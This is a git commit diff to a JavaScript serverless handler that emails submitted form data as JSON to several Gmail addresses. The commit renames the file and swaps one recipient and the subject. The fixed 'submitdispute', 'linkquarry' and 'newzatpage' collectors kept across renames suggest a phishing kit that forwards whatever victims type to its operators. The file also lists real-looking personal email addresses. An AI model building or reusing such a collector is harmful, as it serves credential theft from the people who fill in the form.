4e112b2222ba174120cfad47abe013b0572f1b84
zm9807350 <zm9807350@gmail.com>
2026-03-04 10:18:09 +0500

    Update and rename Dilbar.js to jano.js

--- jano.js
+++ jano.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,dilbarnizamani671@gmail.com",
-      subject: "Dilbar",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,janojaan5744@gmail.com",
+      subject: "jano",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
